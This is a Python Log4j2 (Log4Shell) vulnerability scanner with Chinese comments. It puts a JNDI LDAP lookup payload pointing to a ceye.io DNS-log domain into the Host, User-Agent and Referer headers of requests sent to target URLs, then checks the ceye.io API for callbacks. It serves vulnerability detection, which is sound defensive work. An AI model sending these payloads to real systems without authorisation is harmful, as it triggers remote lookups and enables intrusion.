'''
@文件        :log4j2_scan.py
@说明        :
@时间        :2021/12/14 15:20:48
@作者        :eleven
@版本        :0.1
'''
import argparse
import requests
from requests.exceptions import Timeout

class Log4j2Scan:
    def __init__(self):
        self.data = []

 # 暂时只改变host 和referer ，后续还可以加其他的头  
    def change_header(self,host,payload):
        header_dic = {"Host":host + payload,"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0"+ payload ,"Referer":payload}
        return header_dic
    def change_get():
        pass
    def change_json():
        pass
    def change_cookie():
        pass

    def url_parse_host(self,url):
        host = url.split("/")[-1]
        return host 
# 因为ceye.io  filter 最大二十个字符    

    def url_parse_filter(self,url):
        filter = url.split("/")[-1][0:19]
        return filter 

    def scan(self,url,identifier_url, apitoken):
        filter = self.url_parse_filter(url)
        host = self.url_parse_host(url)
        ceye_url = filter + "." + identifier_url 

# 暂时只支持一个payload
        payload ="${jndi:ldap://"+ ceye_url + "}"
        header = self.change_header(host, payload)
 
        proxies = {
    'https': "http://127.0.0.1:8080",
    'http': "http://127.0.0.1:8080"
}

        # 需要设置超时等异常
        try:
            resp = requests.get(url,headers=header,timeout=2)
            ceye_url = "http://api.ceye.io/v1/records?token=" + apitoken + "&type=dns&filter=" + filter
            resp = requests.get(ceye_url,verify=False)
            print (resp.content.decode('utf-8'))
            if resp.status_code==200:
                if filter in resp.content.decode('utf-8'):
                    with open('output.txt', 'a') as f:
                        f.write(url + "\n")
                        message = url + " is vulnerable"
                        print('\033[1;32m%s\033[1;m' % message)
                        
        except:
             print (url + "请求超时")   
                     
    
if __name__ == '__main__':

    log4j2scan = Log4j2Scan()
    parser = argparse.ArgumentParser()
    parser.add_argument('-k', dest='apitoken', help='ceye.io个人页面的token')
    parser.add_argument('-c', dest='identifier', help='ceye.io个人页面的identifier')
    parser.add_argument('-u', dest='url', help='单个url')
    parser.add_argument('-f', dest='file', help='批量URL检测')
    args = parser.parse_args()      # parse_args()从指定的选项中返回一些数据
    if args.file:
        file = args.file
        with open(file, "r", encoding='UTF-8') as files:
            file_data = files.readlines()  # 读取文件
            for url in file_data:
                url = url.strip('\n')
                log4j2scan.scan(url,args.identifier,args.apitoken)
    elif args.url:
        log4j2scan.scan(args.url, args.identifier, args.apitoken)
    else:
        pass
                


    

